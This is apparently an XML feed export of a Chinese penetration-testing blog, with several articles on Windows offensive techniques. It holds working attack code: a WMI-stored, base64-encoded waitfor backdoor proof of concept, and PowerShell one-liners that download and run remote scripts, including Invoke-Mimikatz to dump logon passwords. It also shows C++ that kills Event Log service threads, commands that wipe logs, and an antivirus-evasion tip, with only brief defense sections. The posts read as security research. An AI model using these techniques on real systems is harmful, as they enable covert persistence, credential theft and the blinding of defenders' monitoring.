xmlns:user=&quot;urn:my-scripts&quot;&gt; &lt;msxsl:script language=&quot;VBScript&quot; implements-prefix=&quot;user&quot;&gt; function myFunction() set shell=createobject(&quot;wscript.shell&quot;) shell.run &quot;calc.exe&quot;,0 myFunction = 0 end function &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:myFunction()&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 以上文件内容对应github地址：https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/VBScript.xml 注： 调用函数名要对应： &lt;xsl:value-of select=&quot;user:myFunction()&quot;/&gt; 3、远程执行msxsl.exe也支持远程执行，参数如下： msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml 如下图 注： 该方法是从Evi1cg学来的，博客地址：https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html 0x04 防御 添加Applocker的可执行规则，指定msxsl.exe 如下图 即使更改文件路径，msxsl.exe仍然无法执行 如下图 0x05 小结 本文介绍了利用msxsl绕过AppLocker的方法，但是通过定制AppLocker规则，还是能够限制该方法的使用。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use Waitfor.exe to maintain persistence]]></title>
    <url>%2Fposts%2Ff4e0238b.html</url>
    <content type="text"><![CDATA[0x00 前言 从Casey Smith‏@subTee的Twitter上获得的一个思路，利用Waitfor.exe有可能实现一种后门机制。于是我对其做了进一步研究，并且使用Powershell写了一个后门利用的POC。本文将要介绍Waitfor.exe在渗透测试中的利用技巧，并且分享开发POC的思路和细节。 完整POC下载地址如下： https://github.com/3gstudent/Waitfor-Persistence 0x01 简介 本文将要具体介绍以下内容： Waitfor.exe简介 利用思路 POC细节 0x02 Waitfor.exe简介 用来同步网络中计算机，可以发送或等待系统上的信号 支持系统： Windows Server 2003 Windows Vista Windows XP Windows Server 2008 Windows 7 Windows Server 2003 with SP2 Windows Server 2003 R2 Windows Server 2008 R2 Windows Server 2000 Windows Server 2012 Windows Server 2003 with SP1 Windows 8 Windows 10 其他Server系统未测试，理论上支持 位于System32文件夹下，以命令行方式启动 支持参数如下图 具体细节如下： /s &lt;Computer&gt;：指定发送的目的计算机的名称或IP地址（不能使用反斜杠）。如果不加此参数，将会在域内以广播形式发送 /u [&lt;Domain&gt;\]&lt;User&gt;：使用指定用户帐户的凭据运行脚本。如果不加此参数，表示使用当前用户的凭据 /p [&lt;Password&gt;]：用户密码 /si：表示发送信号，用于激活，如果不加此参数，表示等待接收信号 /t &lt;Timeout&gt;：指定等待信号的秒数。如果不加此参数，表示无限期等待 &lt;SignalName&gt;：指定的信号名称，大小写不敏感，长度不能超过225个字符 注： Computers can only receive signals if they are in the same domain as the computer sending the signal. 即同一网段的主机才能接收信号 主要用途： 实现同一网段内的主机同时执行命令 测试实例：开启等待模式： cmd： waitfor signalcalc &amp;&amp; calc.exe 参数说明： 信号名称： signalcalc 接收信号后的操作：calc.exe，即启动计算器 此时，后台存在进程waitfor.exe 发送信号： cmd： waitfor /s 127.0.0.1 /si signalcalc 参数说明： 目的计算机：127.0.0.1（本机测试使用），域内使用换成主机ip /si表示发送信号 信号名称： signalcalc 详细操作如下图 注： 更多基本介绍可参照微软官方文档，链接如下： https://technet.microsoft.com/en-us/library/cc731613(v=ws.11).aspx 0x03 利用思路 根据以上的基本介绍，最直观的认识，waitfor可被当作后门来使用 Daniel Bohannon‏ @danielhbohannon在twitter上分享了他的利用思路：将waitfor接收信号后的操作设置为从远程服务器下载powershell代码并执行 地址如下： https://twitter.com/danielhbohannon/status/872258924078092288 细节如下图 此外，他还提到了一个有趣的技巧：如果将powershell代码设置为延期执行，那么接收信号后，后台将不存在进程waitfor.exe 我验证了这个结论，方法如下： 开启等待模式： cmd： waitfor test1 &amp;&amp; &amp;&amp; powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1&#39;) 发送信号： cmd： waitfor /s 127.0.0.1 /si test1 https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1的内容如下： Start-Sleep -Seconds 10; start-process calc.exe; 当成功接收信号后，进程waitfor.exe退出 接着执行powershell脚本，等待10秒再启动calc.exe 这10秒内，只存在进程powershell.exe 也就是说，如果把等待时间设置更长，那么再这一段等待时间内不存在进程waitfor.exe，提醒防御者注意这个细节 0x04 POC细节 如果作为一个后门，那么上面的利用方法还不够成熟 因为触发一次后，进程waitfor.exe将退出，导致该后门无法重复使用 需要再次开启一个等待模式，才能再次触发后门 当然，可以在每次后门触发后手动开启一个等待模式 但这不够智能，能否通过脚本实现自动开启等待模式，使其成为一个可持续触发的后门呢？ 为此，我写了以下POC 思路1：在目标系统保存一个ps脚本1.ps1 1.ps1内容如下： start-process calc.exe cmd /c waitfor persist `&amp;`&amp; powershell -executionpolicy bypass -file c:\test\1.ps1 注： 转义字符&amp;在powershell中要用`&amp;表示 开启等待模式： cmd： waitfor persist1 &amp;&amp; powershell -executionpolicy bypass -file c:\test\1.ps1 发送信号： cmd： waitfor /s 127.0.0.1 /si persist1 思路2：不在目标系统保存文件 这里使用一个之前在《WMI backdoor》中介绍过的技巧，将payload保存在WMI类中，进行读取使用 存储payload： （管理员权限） $StaticClass = New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null) $StaticClass.Name = &#39;Win32_Backdoor&#39; $StaticClass.Put() $StaticClass.Properties.Add(&#39;Code&#39; , &quot;cmd /c start calc.exe&quot;) $StaticClass.Put() 读取payload： ([WmiClass] &#39;Win32_Backdoor&#39;).Properties[&#39;Code&#39;].Value 以上操作如下图 执行payload： $exec=([WmiClass] &#39;Win32_Backdoor&#39;).Properties[&#39;Code&#39;].Value; iex $exec 注： 通过Invoke-Expression执行命令也可以，使用iex是为了缩短长度 结合waitfor的参数格式，这里选择将代码编码为base64 对执行payload的代码进行base64编码，以下代码保存在code.txt： $exec=([WmiClass] &#39;Win32_Backdoor&#39;).Properties[&#39;Code&#39;].Value; iex $exec 对其进行base64编码，代码如下： $code = Get-Content -Path code.txt $bytes = [System.Text.Encoding]::UNICODE.GetBytes($code); $encoded = [System.Convert]::ToBase64String($bytes) $encoded 获得base64加密代码如下： JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA== 以上操作如下图 测试base64加密代码： powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA== 成功执行代码，如下图 根据以上思路，POC如下： 后门代码： （管理员权限） $StaticClass = New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null) $StaticClass.Name = &#39;Win32_Backdoor&#39; $StaticClass.Put() $StaticClass.Properties.Add(&#39;Code&#39; , &quot;cmd /c start calc.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==&quot;) $StaticClass.Put() 注： 存在两次转义字符 ``用来表示` 安装代码： $exec=([WmiClass] &#39;Win32_Backdoor&#39;).Properties[&#39;Code&#39;].Value; iex $exec 激活命令： waitfor /s 127.0.0.1 /si persist 实际测试如下图 存在bug，导致powershell.exe无法正常退出，进程在后台残留 所以需要添加一段代码，用来结束进程powershell.exe 注： 根据逻辑关系，结束powershell.exe的代码要写在powershell -nop -W Hidden -E ...之前 最终，完整POC代码如下： 后门代码： （管理员权限） $StaticClass = New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null) $StaticClass.Name = &#39;Win32_Backdoor&#39; $StaticClass.Put()| Out-Null $StaticClass.Properties.Add(&#39;Code&#39; , &quot;cmd /c start calc.exe ```&amp;```&amp; taskkill /f /im powershell.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==&quot;) $StaticClass.Put() | Out-Null $exec=([WmiClass] &#39;Win32_Backdoor&#39;).Properties[&#39;Code&#39;].Value; iex $exec | Out-Null 激活命令： waitfor /s 127.0.0.1 /si persist 完整演示如下图 不存在进程残留的问题 0x05 防御 留意后台进程waitfor.exe 对于后台的可疑进程cmd.exe和powershell.exe，可使用Process Explorer查看其启动参数，如下图 也可以读取以上进程中的历史回显内容，参考资料如下： http://jblog.javelin-networks.com/blog/cli-powershell/ 0x06 小结 本文介绍了Waitfor.exe后门的实现思路，也许还会有更多的利用技巧 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用JS加载.Net程序]]></title>
    <url>%2Fposts%2Fcd6fa700.html</url>
    <content type="text"><![CDATA[0x00 前言 最近James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，很有趣。Casey Smith和Cn33liz都对此做了进一步研究，开源了他们的利用代码。本文将要对该技术作系统整理，帮助大家更好的认识。 0x01 简介 本文将要介绍以下内容： DotNetToJScript编译方法 DotNetToJScript使用方法 利用JS/Vbs执行shellcode 利用JS/Vbs执行powershell脚本 0x02 DotNetToJScript编译方法 DotNetToJScript下载地址： https://github.com/tyranid/DotNetToJScript 使用工具VS2012进行编译 报错1：缺少程序集引用NDesk.Options 解决方法： 需要添加引用NDesk.Options 下载地址： http://www.ndesk.org/Options 解压缩，工程-添加引用-浏览-\ndesk-options-0.2.1.bin\ndesk-options-0.2.1.bin\lib\ndesk-options\NDesk.Options.dll 接下来，将目标框架指定为.NET Frameword 2.0，重新编译 报错2：缺少程序集引用Linq 解决方法： 添加对System.Core.dll 3.5的引用 位置: C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Core.dll 添加引用后编译成功，分别在两个目录生成DotNetToJScript.exe和ExampleAssembly.dll 0x03 DotNetToJScript使用方法 1、生成js脚本参数如下： DotNetToJScript.exe -o 1.js ExampleAssembly.dll 执行后，生成1.js 执行1.js，调用ExampleAssembly.dll中的public TestClass() 如下图 执行过程如下图，弹出对话框 2、生成vbs脚本参数如下： DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll 执行如下图 3、生成vba脚本参数如下： DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll 用来放在office宏中 4、生成sct脚本参数如下： DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll 启动方式: 命令行参数如下： regsvr32.exe /u /n /s /i:3.sct scrobj.dll 注： 细节可参考之前的文章《Use SCT to Bypass Application Whitelisting Protection》 5、生成wsc脚本参数如下： DotNetToJScript.exe -m -o 4.wsc ExampleAssembly.dll 启动方式1：本地调用 通过js调用，js脚本内容如下： GetObject(&quot;script:C:\\test\\4.wsc&quot;); 注： 需要绝对路径，wsc文件后缀名任意 启动方式2：远程启动 将4.wsc保存在github，地址如下： https://raw.githubusercontent.com/3gstudent/test/master/4.wsc js脚本内容如下： GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/test/master/4.wsc&quot;) 注： 细节可参考之前的文章《WSC、JSRAT and WMI Backdoor》 0x04 利用JS/Vbs能够实现的payload汇总 对以上测试中的ExampleAssembly.dll，可替换成其他payload： 1、执行shellcode代码可参考如下地址： https://gist.github.com/subTee/618d40aa4229581925eb9025429d8420#gistcomment-2057305 新建c#工程，可选择c#控制台应用程序，编译成exe 生成js脚本的参数如下： DotNetToJScript.exe -o shellcode.js shellcode.exe 测试如下图 2、执行mimikatz代码可参考如下地址： https://gist.github.com/subTee/b30e0bcc7645c790fcd993cfd0ad622f 在c#中执行mimikatz的代码可参考如下地址： https://gist.github.com/subTee/5c636b8736530fb20c3d 3、执行powershell代码可参考如下地址： https://github.com/Cn33liz/StarFighters 作者：Cn33liz StarFighters： 能够加载Empire框架的启动代码 支持JavaScript和VBScript 不需要powershell.exe，可用于绕过白名单拦截 通过powershell runspace environment (.NET)执行powershell代码 执行powershell代码的方式可参考工程p0wnedShell，地址如下： https://github.com/Cn33liz/p0wnedShell 我之前对此做过研究，对其精简代码，使其支持.net 2.0，地址如下： https://github.com/3gstudent/Smallp0wnedShell 实际测试： StarFighters不仅能够加载Empire框架的启动代码，也可用来直接执行powershell命令 方式如下： （1）执行powershell单条命令 需要对命令作base64编码，命令如下： $code = &#39;start calc.exe&#39; $bytes = [System.Text.Encoding]::UNICODE.GetBytes($code); $encoded = [System.Convert]::ToBase64String($bytes) $encoded 得到base64代码如下： cwB0AGEAcgB0ACAAYwBhAGwAYwAuAGUAeABlAA== 替换StarFighter.js中的var EncodedPayload 成功执行，弹出计算器如下图 （2）本地执行powershell脚本 使用Invoke-Mimikatz.ps1，下载地址如下： https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 添加导口令的操作代码： Invoke-Mimikatz -Command &quot;log privilege::debug sekurlsa::logonpasswords&quot; 注： 添加log参数是为了将结果导出到文件mimikatz.log 命令如下： $code = Get-Content -Path Invoke-Mimikatz.ps1 $bytes = [System.Text.Encoding]::UNICODE.GetBytes($code); $encoded = [System.Convert]::ToBase64String($bytes) $encoded | Out-File 1.txt 将生成的1.txt中的内容替换StarFighter.js中的var EncodedPayload （3）远程执行powershell脚本 powershell命令如下： powershell IEX &quot;(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -Command &#39;log privilege::debug sekurlsa::logonpasswords&#39;&quot; 作base64的代码如下： $code = Get-Content -Path code.txt $bytes = [System.Text.Encoding]::UNICODE.GetBytes($code); $encoded = [System.Convert]::ToBase64String($bytes) $encoded | Out-File 2.txt 将生成的2.txt中的内容替换StarFighter.js中的var EncodedPayload 注： 某杀毒软件默认会查杀该js脚本，一个绕过静态查杀的思路（不保证有效期）： 将脚本保存成ASCII格式，会被查杀 换成UNICODE格式，不被查杀 0x05 防御 站在防御的角度，大家都会对powerShell.exe作拦截，但是这还远远不够: powershell runspace environment (.NET)才是重点 具体到本文的技巧，防御方法如下： 分别对js、vbs、vba宏、sct、wsc脚本作限制 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过]]></title>
    <url>%2Fposts%2Fbdedcf59.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《渗透技巧——Windows日志的删除与绕过》中提到一个绕过Windows日志监控的思路：使用API NtQueryInformationThread和I_QueryTagInformation获取线程对应的服务，关闭对应日志记录功能的线程，能够破坏日志功能，并且Windows Event Log服务没有被破坏，状态仍为正在运行。本文将要对其详细介绍，分享使用c++在编写程序上需要注意的细节。 0x01 简介 本文将要介绍以下内容： 程序自身提权 遍历进程中的所有线程 根据线程tid，获取对应的进程pid 根据线程tid，获取对应的服务名称 结束线程 0x02 程序实现 开发工具： VS2012开发语言： c++ 1、定位eventlog服务对应进程svchost.exe的pidpowershell代码如下： Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId 通过回显能够找出进程svchost.exe的pid 2、程序自身提权，以管理员权限执行因为进程svchost.exe为系统权限，所以对其线程进行操作也需要高权限，因此，程序需要先提升至管理员权限 提权至管理员权限的代码如下： BOOL SetPrivilege() { HANDLE hToken; TOKEN_PRIVILEGES NewState; LUID luidPrivilegeLUID; if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)||!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidPrivilegeLUID)) { printf(&quot;SetPrivilege Error\n&quot;); return FALSE; } NewState.PrivilegeCount = 1; NewState.Privileges[0].Luid = luidPrivilegeLUID; NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if(!AdjustTokenPrivileges(hToken, FALSE, &amp;NewState, NULL, NULL, NULL)) { printf(&quot;AdjustTokenPrivilege Errro\n&quot;); return FALSE; } return TRUE; } 3、遍历进程中的所有线程定位进程svchost.exe后，需要遍历该进程中的所有线程，然后进行筛选 根据进程pid遍历其子进程的代码如下： BOOL ListProcessThreads(DWORD pid) { HANDLE hThreadSnap = INVALID_HANDLE_VALUE; THREADENTRY32 te32; hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (hThreadSnap == INVALID_HANDLE_VALUE) return(FALSE); te32.dwSize = sizeof(THREADENTRY32); if (!Thread32First(hThreadSnap, &amp;te32)) { printf(&quot;Thread32First&quot;); CloseHandle(hThreadSnap); return(FALSE); } do { if (te32.th32OwnerProcessID == pid) printf(&quot;tid= %d\n&quot;,te32.th32ThreadID); } while (Thread32Next(hThreadSnap, &amp;te32)); CloseHandle(hThreadSnap); return(TRUE); } 获取进程中的所有线程tid，如下图 4、判断线程是否满足条件筛选出Windows Event Log服务对应的线程，方法如下： 根据线程tid，获取对应的服务名称 可参考以下链接： https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/ 文中提到，需要使用三个API： NtQueryInformationThread： 来自ntdll.dll dll路径：%WinDir%\System32\ 使用IDA对其验证，查看ntdll.dll的导出函数，能够发现API函数NtQueryInformationThread，如下图 具体使用方式： typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG); FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL; pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(_T(&quot;ntdll&quot;)), &quot;NtQueryInformationThread&quot;); I_QueryTagInformation： 来自advapi32.dll dll路径：%WinDir%\System32\下 使用IDA对其验证，查看advapi32.dll的导出函数，能够发现API函数I_QueryTagInformation，如下图 具体使用方式： typedef ULONG (WINAPI* FN_I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY); FN_I_QueryTagInformation pfnI_QueryTagInformation = NULL; HMODULE advapi32 = LoadLibrary(L&quot;advapi32.dll&quot;); pfnI_QueryTagInformation = (FN_I_QueryTagInformation)GetProcAddress(advapi32, &quot;I_QueryTagInformation&quot;); NtReadVirtualMemory： 可使用ReadProcessMemory代替 更为完整的代码实例可参考如下链接： http://blog.naver.com/PostView.nhn?blogId=gloryo&amp;logNo=110129121084&amp;redirect=Dlog&amp;widgetTypeCall=true 该文章分享了一段代码，提供进程pid和线程tid，能够获取对应的服务名称 当然，我们需要对该代码作改进，不需要提供进程pid，只需要线程tid就好 根据线程tid获取对应进程pid，代码如下： BOOL QueryThreadBasicInformation(HANDLE hThread) { typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG); FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL; pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(_T(&quot;ntdll&quot;)), &quot;NtQueryInformationThread&quot;); THREAD_BASIC_INFORMATION threadBasicInfo; LONG status = pfnNtQueryInformationThread(hThread, ThreadBasicInformation, &amp;threadBasicInfo,sizeof(threadBasicInfo), NULL); printf(&quot;process ID is %u\n&quot;,threadBasicInfo.clientId.uniqueProcess); printf(&quot;Thread ID is %u\n&quot;,threadBasicInfo.clientId.uniqueThread); return TRUE; } 测试程序能够通过tid获取相关进程pid，运行如下图 至此，我们能够根据提供的线程tid判断出对应的进程pid和服务名称 接着，需要添加判断功能，筛选出eventlog服务，进行下一步操作：结束线程 5、结束线程同结束进程类似，需要提供进程tid，代码如下： void TerminateEventlogThread(DWORD tid) { HANDLE hThread = OpenThread(0x0001,FALSE,tid); if(TerminateThread(hThread,0)==0) printf(&quot;--&gt; Error !\n&quot;); else printf(&quot;--&gt; Success !\n&quot;); CloseHandle(hThread); } 综上，将所有功能集成到一个程序中，使用时只需要提供进程svchost.exe的pid就好 完整源代码下载地址： https://github.com/3gstudent/Windwos-EventLog-Bypass/blob/master/WindowsEventLogBypass.cpp 0x03 实际测试 获取进程svchost.exe的pid： Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId 获得pid为916 运行WindowsEventLogBypass.exe，添加pid 参数如下： WindowsEventLogBypass.exe 916 实际测试，如下图 成功结束线程，日志功能失效，如下图 0x04 小结 本文介绍了使用c++编写程序绕过Windows日志的技巧，同Halil Dalabasmaz@hlldz分享的Powershell工程Invoke-Phant0m结合学习，希望能够帮助大家更好的了解这项技术。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows日志的删除与绕过]]></title>
    <url>%2Fposts%2F11a6a1e2.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试过程中，Windows日志往往会记录系统上的敏感操作，如添加用户，远程登录执行等。 对于一次完整的渗透测试，通常会选择对Windows日志进行清除和绕过，而对于防御者来说，了解常用的绕过方法也有助于更好的保护自己的系统。 所以本文将要介绍常见的Windows日志清除与绕过方法，分享经验，帮助大家。 0x01 简介 本文将要介绍以下内容： Windows日志的常用清除方法 Windows日志的两种绕过方法 0x02 Windows日志 Windows日志包括五个类别： 应用程序 安全 Setup 系统 转发事件 查看方式： 1、 通过面板 位置如下： Control Panel\System and Security-View event logs-Windows Logs 如下图 2、 通过Powershell 常用命令如下： (管理员权限) 查看所有日志： Get-WinEvent 查看应用程序类别下的日志： Get-WinEvent -FilterHashtable @{logname=&quot;Application&quot;;} 0x03 Windows日志的常用清除方法 1、wevtutil.exe操作系统默认包含，支持系统：Win7及以上 常用命令如下： (1) 统计日志列表，查询所有日志信息，包含时间，数目 wevtutil.exe gli Application 操作如下图 (2) 查看指定类别的日志内容 wevtutil qe /f:text Application 操作如下图 (3) 删除该类日志所有内容 wevtutil cl Application 操作如下图 Application日志全部清除，数目为0 (4) 删除单条内容 尚不支持 2、NSA DanderSpiritzDanderSpritz是NSA的一款界面化的远控工具 相关介绍可参考： https://3gstudent.github.io/3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95/ 常用命令如下： (1) 统计日志列表，查询所有日志信息，包含时间，数目 eventlogquery -log Application (2) 查看指定类别的日志内容 eventlogfilter -log Application -num 10 (3) 删除该类日志所有内容 eventlogclear -log Application (4) 删除单条内容 eventlogedit -log Application -record 1 注： record序号可通过eventlogfilter获得 0x04 Windows日志的绕过方法 本文介绍的思路参考自Halil Dalabasmaz@hlldz的文章，地址如下： https://artofpwn.com/phant0m-killing-windows-event-log.html 绕过原理： Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，调用TerminateThread结束线程，破坏日志记录功能 特别的地方： 由于只结束了实现日志功能的线程，所以Windows Event Log服务没有被破坏，状态仍为正在运行 绕过方法一1、 定位eventlog服务对应进程svchost.exe的pid 2、 遍历该进程中的所有线程 3、 判断线程是否满足条件 Windows Event Log 服务需要调用wevtsvc.dll，完整路径为%WinDir%\System32\wevtsvc.dll 并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能 4、 结束线程 使用TerminateThread 注： Halil Dalabasmaz@hlldz使用powershell实现了方法一，完整代码可参考： https://github.com/hlldz/Invoke-Phant0m powershell脚本执行后，Windows日志功能失效，无法记录日志，操作如下图 5、 恢复方法 结束进程svchost.exe 重新开启Windows Event Log 服务： net start eventlog 操作如下图 绕过方法二1、 定位eventlog服务对应进程svchost.exe的pid powershell代码如下： Get-WmiObject -Class win32_service -Filter &quot;name = &#39;eventlog&#39;&quot; | select -exp ProcessId 找到svchost.exe的pid为7008，如下图 2、 遍历该进程中的所有线程 使用PsList 下载地址： https://technet.microsoft.com/en-us/sysinternals/bb896682.aspx 具体参数如下： pslist.exe /accepteula -d 7008 获取进程svchost.exe中的所有线程，如下图 3、 判断线程是否满足条件 获取线程对应的服务，如果为eventlog，则满足条件 使用工具：ScTagQuery 下载地址： http://www.winsiderss.com/tools/sctagquery/sctagqry.zip 具体参数如下： sctagqry.exe -t 7928 根据返回的结果Service Tag，判断线程对应的服务 找到对应eventlog的线程，如下图 线程8136符合条件，依次尝试，直到获取所有符合条件线程 注： 使用Process Explorer可以简化此过程 找到eventlog服务对应进程svchost.exe 如下图 右键查看属性，选择Threads标签，查看线程,可直接获得线程对应的服务 如下图 符合条件的线程TID为： 8136 8052 6708 2316 6356 4、 结束线程 调用TerminateThread 通过c++实现，部分代码如下： int main(int argc, char* argv[]) { printf(&quot;TerminateThread TID:\n&quot;); for(int i=1;i&lt;argc;i++) { printf(&quot;%s\n&quot;,argv[i]); HANDLE hThread = OpenThread(0x0001, FALSE,atoi(argv[i])); if(TerminateThread(hThread,0)==0) printf(&quot;[!] TerminateThread Error, TID: %s \n&quot;,argv[i]); CloseHandle(hThread); } return 0; } 完整代码已上传至github，地址如下： https://github.com/3gstudent/Windwos-EventLog-Bypass/blob/master/TerminateEventLogThread.cpp 控制台支持传入多个参数，向其传入5个TID： 8136 8052 6708 2316 6356 自动结束对应线程，日志功能失效 具体操作如下图 注： 稍后我会在github上更新该绕过方法的完整实现代码，地址如下： https://github.com/3gstudent/Windwos-EventLog-Bypass 0x05 补充 1、安装sysmon可对Windows日志功能进行扩展相关介绍和绕过思路可参考; https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87APC%E5%AE%9E%E7%8E%B0Dll%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87Sysmon%E7%9B%91%E6%8E%A7/ 2、绕过方法仅针对Windows日志对应用程序和服务日志失效，例如Windows Powershell 如下图 0x06 小结 本文对Windows日志的清除和绕过方法做了介绍，希望能够帮助大家，接下来会分享绕过方法二的具体程序实现方法。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Use AppDomainManager to maintain persistence]]></title>
    <url>%2Fposts%2Fb2be9cd8.html</url>
    <content type="text"><![CDATA[0x00 前言 从Casey Smith@subTee学到的一个技巧：针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制。 学习链接： http://subt0x10.blogspot.com/2017/06/attacking-clr-appdomainmanager-injection.html 0x01 简介 本文将要介绍以下内容： 劫持自己开发的.Net程序 劫持系统.Net程序powershell_ise.exe 一种针对Visual Studio的利用思路 0x02 相关概念 CLR： 全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。 CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行： 在CLR监视之下运行的程序属于“托管的”（managed）代码 不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码 对于在CLR监视之下的程序，程序启动的初始化过程可参考如下链接： http://mattwarren.org/2017/02/07/The-68-things-the-CLR-does-before-executing-a-single-line-of-your-code/ 值得注意的地方： 如果能从程序启动的初始化过程中找到一个可供利用的位置，在程序启动之前加载我们自己的代码，那么就可以“滥用”CLR的功能，实现对程序的劫持 更理想的情况下： 如果可被劫持的程序是一个系统常用程序，随开机自启动，那么，这个方法就能作为一个持续性后门 下面介绍Casey Smith@subTee分享的后门思路：AppDomainManager 0x03 劫持自己开发的.Net程序 注： 代码引用自：http://subt0x10.blogspot.com/2017/06/attacking-clr-appdomainmanager-injection.html 1、编写示例程序使用Visual Studio，选择c#开发环境，新建控制台应用程序，工程名：program，代码如下： using System; public class Program { public static void Main() { Console.WriteLine(&quot;Inside the App&quot;); } } 编译生成program.exe 程序运行如下图 2、编写payload Dll选择c#开发环境，新建类库，工程名：DomainManager，代码如下： using System; namespace DomainManager { public class InjectedDomainManager : AppDomainManager { public override void InitializeNewDomain(AppDomainSetup appDomainInfo) { base.InitializeNewDomain(appDomainInfo); Console.WriteLine(&quot;Blah From AppMgr&quot;); } } } 编译生成DomainManager.dll 3、设置AppDomainManager劫持程序启动将DomainManager.dll放于同级目录 方法1： cmd设置环境变量： set APPDOMAIN_MANAGER_ASM=DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null set APPDOMAIN_MANAGER_TYPE=DomainManager.InjectedDomainManager 执行program.exe，通过查看回显，发现DomainManager.dll先于program.exe执行 成功实现劫持，完整操作如下图 注： 注意比较执行顺序 通过cmd设置环境变量的方法只会作用于当前cmd，不够通用 方法2： 更加通用的方法：配置config文件 新建program.exe.config，内容如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;configuration&gt; &lt;startup&gt; &lt;supportedRuntime 